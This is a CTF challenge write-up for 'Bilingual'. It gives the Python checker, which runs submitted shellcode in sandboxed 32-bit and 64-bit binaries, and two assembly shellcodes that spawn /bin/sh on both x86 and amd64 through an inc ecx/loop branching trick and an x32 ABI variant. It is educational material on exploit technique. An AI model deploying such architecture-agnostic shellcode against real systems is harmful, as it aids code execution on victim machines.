# Bilingual

This was a fun little task I conjured up while wondering about wacky constraints regarding shellcodes. Sadly, this should've been called "Blunderlingual", since the challenge underwent several iterations, code got moved around/changed, and eventually lost one of its constraints.

## Intended challenge

```python
#!/usr/bin/env python3
import subprocess
import sys

VERBOSE = True
PREFIX32 = b'1\xc01\xdb1\xc91\xd21\xf61\xff1\xed\xbc\x00\x00\xad\xde'
PREFIX64 = b'H1\xc0H1\xdbH1\xc9H1\xd2H1\xffH1\xf6H1\xedM1\xc0M1\xc9M1\xd2M1\xdbM1\xe4M1\xedM1\xf6M1\xff\xbc\x00\x00\xad\xde'
FLAG = "[REDACTED]"

class bcolors:
    RED = '\033[1;31m'
    GREEN = '\033[1;32m'
    YELLOW = '\033[1;33m'
    BLUE = '\033[1;34m'
    PURPLE = '\033[1;35m'
    CYAN = '\033[1;36m'
    WHITE = '\033[1;37m'
    HEADER = '\033[95m'
    OKBLUE = '\033[94m'
    OKGREEN = '\033[92m'
    WARNING = '\033[93m'
    ENDC = '\033[0m'

def hexdump(src, color_dict, length=16):
    FILTER = ''.join([(len(repr(chr(x))) == 3) and chr(x) or '.' for x in range(256)])
    lines = []
    for c in xrange(0, len(src), length):
        chars = src[c:c+length]
        hex = ' '.join(["%02x" % ord(x) if x not in color_dict else (color_dict[x] + "%02x" % ord(x) + bcolors.ENDC) for x in chars])
        lines.append("%04x: %-*s\n" % (c, length*3, hex))
    return ''.join(lines)

def check_unique(shellcode):
    if VERBOSE:
        all_colors = [bcolors.PURPLE, bcolors.CYAN, bcolors.GREEN, bcolors.YELLOW, bcolors.BLUE, bcolors.RED]
        color_dict = {}

        for i in shellcode:
            indices = [j for j,x in enumerate(shellcode) if x == i]
            if len(indices) > 1 and i not in color_dict:
                if all_colors:
                    color_dict[i] = all_colors.pop()
        
        if len(shellcode) != len(set(shellcode)):
            print(bcolors.RED + "Shellcode not unique!" + bcolors.ENDC)
            print(hexdump(shellcode, color_dict))
                
    return len(shellcode) == len(set(shellcode))

def check(shellcode, bitness):
    if bitness == 32:
        binary = "./shellbox32"
        payload = PREFIX32 + shellcode
    elif bitness == 64:
        binary = "./shellbox64"
        payload = PREFIX64 + shellcode
    process = subprocess.Popen([binary], stdin=subprocess.PIPE, stdout=subprocess.PIPE)
    process.stdin.write(payload)
    data = process.communicate()[0]
    rc = process.returncode
    return rc

def do_write(msg):
    sys.stdout.write(msg)
    sys.stdout.flush()

def check_print(rc):
    if rc == 1:
        do_write("[" + bcolors.GREEN + "OK" + bcolors.ENDC + "]\n")
    else:
        do_write("[" + bcolors.RED + "FAIL" + bcolors.ENDC + "]\n")

def main():
    print("Please give me your finest shellcode:")
    shellcode = sys.stdin.buffer.read(256)

    print("Got: {}".format(shellcode.hex()))

    # This was missing in the actual challenge
    if not check_unique(shellcode):
        sys.exit(0)

    do_write("[*] Testing x86".ljust(20, '.'))
    ok32 = check(shellcode, 32)
    check_print(ok32)
    do_write("[*] Testing amd64".ljust(20, '.'))
    ok64 = check(shellcode, 64)
    check_print(ok64)

    if ok32 == 1 and ok64 == 1:
        print("Congrats! Here is your flag: {}".format(FLAG))
    else:
        print("Your shellcode is not fine enough")

if __name__=='__main__':
    main()
```

Bilingual asked for a shellcode with the following constraints:
- the same shellcode has to work on both x86 and amd64
- ~~it must have unique bytes~~ (in case it isn't obvious, `check_unique` is completely left uncalled)
- it will be prefixed by a stub which sets all registers to 0 and the stack at `0xdead0000`
- the shellcode is copied into a `r-x` mapping (no self-modifying shellcode allowed)
- the shellcode must perform `execve("/bin/sh", 0, 0)` and nothing else (the sandboxes use seccomp filtering and `ptrace`)

## Solution

There is no straightforward method of solving this (to my knowledge), other than experimenting with various equivalent instructions (`mov`, `add`, `adc`, `xor`, `push`+`pop` and so on). `rasm2` with the `-b` switch is very adequate, or the shellcode compiler from Binary Ninja.

A methodical approach is to figure out the things that are common and the things that are different.

Common:
- `"/bin/sh\0"` needs to be at some `rw-` address (the stack is conveniently at a 32-bit address)
- `ecx`/`rsi` must be zero (stub takes care of this)
- `edx`/`rdx` must be zero (ditto)

Different:
- `rdi` -> `"/bin/sh\0"` instead of `ebx`
- `sys_execve` is number 11 on x86, 59 on `amd64`

```
use32
mov edi, 0xdeacfff0
push edi
mov dword [edi], 0x6e69622f
mov cl, 0x4
add edi, ecx
sub al, 0xc3
shl eax, 0x18
adc eax, 0xc2978cd1
neg eax
stosd
xor ecx, ecx
inc ecx
loop x64
push 0xb
pop eax
mov cl, ah
pop ebx
int 0x80
use64
nop
x64:
pop rdi
xor rax, 0x687314
pop rcx
syscall
```

The crux of this shellcode is at the pairing `inc ecx; loop x64`. The 32 bit process will increment `ecx`; `loop` will decrement it back again to 0, which won't trigger a jump. On the other hand, the 64 bit process will interpret `inc ecx` (`0x41`) as a `rex` prefix for the `loop` instruction. This time, it will decrement `rcx` from `0` to `-1`, jumping to the 64bit part of the shellcode.

## Shellcode that could've worked in a different scenario

In one of the early drafts of this challenge, seccomp was not being used, in order to allow for a greater variety of solutions, such as:

```
use32
  mov ebp, 0x6e69622f
  push ebp
  mov edi, 0xff978cd0
  not edi
  mov dword [esp+4], edi
  add ebx, esp
  mov al, 0xb
  push ebx
  int 0x80
use64
  xor al, 0x30
  xchg edi, ebx
  syscall
```

which uses the [x32 ABI](https://en.wikipedia.org/wiki/X32_ABI) to perform `sys_execve32` on amd64 (to my understanding). Note that this variant does not require branching between the 32bit and 64bit code.

## A note of respect and appreciation

To my amazement, one team did send an intended solution, even though I'm quite positive they saw the blunder, yet chose to stick to the spirit of the challenge anyway. I am deeply humbled by their gesture.